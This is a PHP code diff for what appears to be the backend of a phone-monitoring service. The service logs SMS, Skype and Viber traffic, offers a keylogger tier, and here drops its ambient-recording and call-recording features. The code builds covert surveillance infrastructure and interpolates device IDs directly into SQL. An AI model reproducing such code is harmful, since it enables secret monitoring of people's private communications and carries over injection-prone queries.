@@ -10,8 +10,6 @@ class Devices extends \System\Model
         'any' => 'Wi-Fi and Mobile Network'
     );
     static $networkFeatures = array(
-        'surrounding' => 'surrounding_network',
-        'callRecordings' => 'call_rec_network',
         'photos' => 'photos_network',
         'videos' => 'video_network'
     );
@@ -110,7 +108,6 @@ class Devices extends \System\Model
                 $this->getDb()->exec("DELETE FROM `skype_calls` WHERE `dev_id` = {$devId}") |
                 $this->getDb()->exec("DELETE FROM `skype_messages` WHERE `dev_id` = {$devId}") |
                 $this->getDb()->exec("DELETE FROM `sms_log` WHERE `dev_id` = {$devId}") |
-                $this->getDb()->exec("DELETE FROM `surroundings` WHERE `dev_id` = {$devId}") |
                 $this->getDb()->exec("DELETE FROM `user_dev` WHERE `dev_id` = {$devId}") |
                 $this->getDb()->exec("DELETE FROM `viber_calls` WHERE `dev_id` = {$devId}") |
                 $this->getDb()->exec("DELETE FROM `viber_messages` WHERE `dev_id` = {$devId}") |
@@ -176,12 +173,6 @@ class Devices extends \System\Model
         switch ($module) {
             case 'keylogger':
                 return $this->di['currentDevice']['plan'] == 'PRO Plus';
-
-            case 'surrounding':
-                return ($this->di['currentDevice']['plan'] == 'PRO Plus') || ($this->di['currentDevice']['plan'] == 'PRO');
-
-            case 'callRecordings':
-                return ($this->di['currentDevice']['plan'] == 'PRO Plus') || ($this->di['currentDevice']['plan'] == 'PRO');
 
             case 'photos':
                 return ($this->di['currentDevice']['plan'] == 'PRO Plus') || ($this->di['currentDevice']['plan'] == 'PRO');
